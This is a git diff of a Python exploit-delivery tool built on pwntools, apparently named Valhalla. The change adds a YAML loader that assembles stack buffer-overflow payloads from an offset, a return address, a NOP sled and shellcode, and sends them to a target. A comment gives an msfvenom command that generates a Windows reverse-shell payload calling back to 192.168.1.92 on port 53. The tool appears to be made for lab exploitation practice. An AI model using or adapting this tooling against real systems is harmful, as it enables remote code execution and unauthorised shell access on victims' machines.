@@ -2,6 +2,7 @@
 import random
 import argparse
 import os,sys,string,time
+import yaml
 import ast
 
 import pwn
@@ -23,13 +24,13 @@ def cookieCutterExploit(io = None, silent = None):
 
     buffer = []
 
-    prefix = b""
+    prefix = b''
     offset = 0
-    overflow = b"A" * offset
-    retn = b"BBBB"
-    padding = b"\x90" * 16
-    payload = b"" # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.92 LPORT=53 EXITFUNC=thread -b "\x00\x0a\x0d" -f c
-    postfix = b""
+    overflow = b'A' * offset
+    retn = b'BBBB'
+    padding = b'\x90' * 16
+    payload = b'' # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.92 LPORT=53 EXITFUNC=thread -b "\x00\x0a\x0d" -f c
+    postfix = b''
 
     bufferEntry = prefix + overflow + retn + padding + payload + postfix
     buffer.append(bytes(bufferEntry, encoding='utf-8'))
@@ -49,28 +50,35 @@ def exploit(offset, ret, nop, payload, before = None, io = None, silent = None):
     print('[+] Exploit mode', file=sys.stderr)
 
     buffer = []
-    bufferEntry = (b"A" * int(offset)) + ret + (b"\x90" * int(nop)) + payload
+    bufferEntry = (b'A' * int(offset)) + ret + (b"\x90" * int(nop)) + payload
     buffer.append(bufferEntry)
     send(buffer, io, silent)
 
 #############################################################################################
 #                                                                                           #
-#   jsonExploit                                                                             #
-#   Exploit the application with the given parameters from JSON file                        #
+#   yamlExploit                                                                             #
+#   Exploit the application with the given parameters from yaml file                        #
 #                                                                                           #
+#   path: path to the yaml file                                                             #
 #   io (=None): pwn.tube object representing the connected remote                           #
 #               application. If None, stdout is to be used as io.                           #
 #   silent (=None): if set, do not prompt for user confirmation                             #
 #                                                                                           #
 #############################################################################################
-def jsonExploit(path, io = None, silent = None):
-    print('[+] Json Exploit mode', file=sys.stderr)
+def yamlExploit(path, io = None, silent = None):
+    print('[+] Yaml Exploit mode', file=sys.stderr)
 
-    buffer = []
-    bufferEntry = ""
+    with open(path, 'r') as stream:
+        try:
+            data = yaml.safe_load(stream)
+            offset = data['offset']
+            ret = ast.literal_eval("b'" + data['ret'] + "'")
+            nop = data['nop']
+            payload = ast.literal_eval("b'" + data['payload'] + "'")
 
-    buffer.append(bytes(bufferEntry, encoding='utf-8'))
-    send(buffer, io, silent)
+            exploit(offset, ret, nop, payload, io=io, silent=silent)
+        except yaml.YAMLError as exc:
+            print(exc)
 
 
 #############################################################################################
@@ -222,34 +230,34 @@ ___  _______  |  | |  |__ _____  |  | |  | _____   \n\
     randomValue = random.randint(0, 2)
     if (randomValue == 0):
         print("\
-    ,   |\ ,__\n\
-    |\   \/   `.\n\
-    \ `-.:.     `\n\
-     `-.__ `\=====|\n\
-        /=`'/   ^_\n\
-      .'   /\   .=)\n\
-   .-'  .'|  '-(/_|\n\
- .'  __(  \  .'`\n\
-/_.'`  `.  |`\n\
-          \ |\n\
-          |/\n\
+                ,   |\ ,__\n\
+                |\   \/   `.\n\
+                \ `-.:.     `\n\
+                 `-.__ `\=====|\n\
+                    /=`'/   ^_\n\
+                  .'   /\   .=)\n\
+               .-'  .'|  '-(/_|\n\
+             .'  __(  \  .'`\n\
+            /_.'`  `.  |`\n\
+                      \ |\n\
+                      |/\n\
         ", file=sys.stderr)
     elif (randomValue == 1):
         print("\
-     _.-._\n\
-   .' | | `.\n\
-  /   | |   \n\
- |    | |    |\n\
- |____|_|____|\n\
- |____(_)____|\n\
- /|(o)| |(o)|\\\n\
-//|   | |   |\\\\\n\
-'/|  (|_|)  |\`\n\
- //.///|\\\\\\.\\\\\n\
- /////---\\\\\\\\\\ \n\
- ////|||||\\\\\\\\\n\
- '//|||||||\\\\`\n\
-   '|||||||`\n\
+                     _.-._\n\
+                   .' | | `.\n\
+                  /   | |   \n\
+                 |    | |    |\n\
+                 |____|_|____|\n\
+                 |____(_)____|\n\
+                 /|(o)| |(o)|\\\n\
+                //|   | |   |\\\\\n\
+                '/|  (|_|)  |\`\n\
+                 //.///|\\\\\\.\\\\\n\
+                 /////---\\\\\\\\\\ \n\
+                 ////|||||\\\\\\\\\n\
+                 '//|||||||\\\\`\n\
+                   '|||||||`\n\
         ", file=sys.stderr)
     elif (randomValue == 2):
         print("\
@@ -317,10 +325,9 @@ if __name__ == "__main__":
     parser.add_argument("-n", "--nop", help="Nop sled size, just before the payload")
     parser.add_argument("-p", "--payload", help="Payload bytes, to put after the Nop sled. Must be in python byte format, for example \"b'\\x42\\x42\\x42\\x42'\"")
     parser.add_argument("-k", "--cookie", help="Call the cookie-cutter exploit function, written by user", action="store_true")
-    parser.add_argument("-j", "--json", help="Load the exploit parameters from the fiven json file")
+    parser.add_argument("-y", "--yaml", help="Load the exploit parameters from the given yaml file")
     
     args = parser.parse_args()
-
     
     if (args.version):
         print ("Valhalla version 999.0.0")
@@ -353,8 +360,8 @@ if __name__ == "__main__":
                 print('[-] Exploit mode needs offset (-o), return address (-r), nop sled size (-n), and payload (-p)', file=sys.stderr)
         elif (args.cookie):
             cookieCutterExploit(io=io, silent=args.silent)
-        elif (args.json):
-            jsonExploit(path=args.json, io=io, silent=args.silent)
+        elif (args.yaml):
+            yamlExploit(path=args.yaml, io=io, silent=args.silent)
 
         if (io):
             io.close()
